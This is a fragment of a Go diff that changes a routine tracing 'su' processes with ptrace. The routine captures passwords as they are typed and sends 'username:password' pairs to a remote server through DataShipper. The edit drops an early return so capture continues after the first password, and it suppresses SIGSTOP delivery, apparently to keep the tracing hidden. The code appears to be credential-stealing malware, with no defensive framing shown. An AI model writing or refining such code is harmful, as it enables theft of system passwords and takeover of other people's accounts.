@@ -64,13 +64,15 @@ func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]i
 						if IsValidPassword(password) {
 							username := extractSUUsername(pid)
 							go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
-							return
 						}
 					}
 				}
 			}
 		} else if wstatus.Stopped() {
-			sigToDeliver = int(wstatus.StopSignal())
+			sig := wstatus.StopSignal()
+			if sig != syscall.SIGSTOP {
+				sigToDeliver = int(sig)
+			}
 		}
 
 		if err := syscall.PtraceSyscall(pid, sigToDeliver); err != nil {
